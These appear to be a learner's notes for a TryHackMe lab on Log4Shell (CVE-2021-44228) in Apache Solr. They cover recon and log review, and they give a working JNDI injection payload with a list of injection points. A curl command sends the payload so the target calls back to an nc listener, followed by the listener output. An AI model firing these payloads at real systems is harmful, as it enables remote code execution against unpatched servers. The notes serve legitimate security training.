# Room
https://tryhackme.com/room/solar

# Task 1 - CVE-2021-44228 Intro
* CVE-2021-44228 impacts the Java logging package log4j and has a severity score of 10.0
* The attack offers trivial Remote Code Execution and has named Log4Shell
* Log4j is used by millions of applications around the world
* Resources
    * https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
    * https://log4shell.huntress.com/
    * https://www.youtube.com/watch?v=7qoPDq41xhQ

# Task 2 - Recon
* Scan the vulnerable machine
    ```
    nmap -v -A -T4 10.10.190.180
    ```

# Task 3 - Discovery
* The example machine is running Apache Solr 8.11.0 that includes a vulnerable version of log4j
* A connection to the machine in a web browser on port 8983 allows you to explore Solar
* Connect to the machine on port 8983 and answer the challenge questions
    * By default, the Solr log dir is /var/solr/logs
    * Open the attached Solr logs and review them, an interesting INFO entry is below
        ```
        2021-12-13 03:47:56.844 INFO  (qtp1083962448-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={} status=0 QTime=0
        ```
    * /admin/cores is a URL that may be exploitable with the data entrypoint of params

# Task 4 - Proof of Concept
* Setting up the poc requires you to prefix the URL above with /solr, so: /solr/admin/cores
* Log4j adds logic to logs to enrich data, this logic may contain actions that could be executed
* A few examples are:
    ```
    ${$sys:os.name}
    ${ENV:PATH}
    ```
* The payload to abuse the log4j vulnerability is
    ```
    ${jndi:ldap://ATTACKERCONTROLLEDHOST}
    ```
* JNDI - Java Naming and Directory Interface
* The target of the attack will reach out to an LDAP endpoint controlled by an attacker
* You can insert this payload anywhere that data is logged by the application, for example:
    * Input boxes, user and password login forms, any data entry point in an application
    * HTTP headers like User-Agent and X-Forwared-For
    * Any form that has user supplied data
* JNDI Resource
    * https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
* poc in action
    * start a listener
    ```
    nc -nvlp 9999
    ```
    * curl the vulnerable machine with a call back to your listener on the attack box
    ```
    curl 'http://10.10.190.180:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.252.70:9999\}'
    ```
    * verify connection
    ```
    Listening on [0.0.0.0] (family 0, port 9999)
    Connection from 10.10.190.180 54972 received!
    0
    `\ufffd
    ```